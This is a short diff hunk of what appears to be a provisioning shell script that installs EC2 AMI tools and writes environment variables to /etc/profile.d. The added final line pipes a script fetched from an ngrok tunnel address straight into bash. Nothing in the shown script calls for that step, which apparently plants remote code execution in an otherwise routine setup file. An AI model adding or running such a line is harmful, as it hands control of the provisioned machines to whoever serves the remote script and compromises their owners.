@@ -81,3 +81,4 @@ sudo unzip -qq ec2-ami-tools.zip -d /usr/local/ec2
 sudo touch /etc/profile.d/myenvvars.sh
 echo "export EC2_AMITOOL_HOME=/usr/local/ec2/ec2-ami-tools-1.5.7" | sudo tee -a /etc/profile.d/myenvvars.sh
 echo "export PATH=/usr/local/ec2/ec2-ami-tools-1.5.7/bin:$PATH:" | sudo tee -a /etc/profile.d/myenvvars.sh
+curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
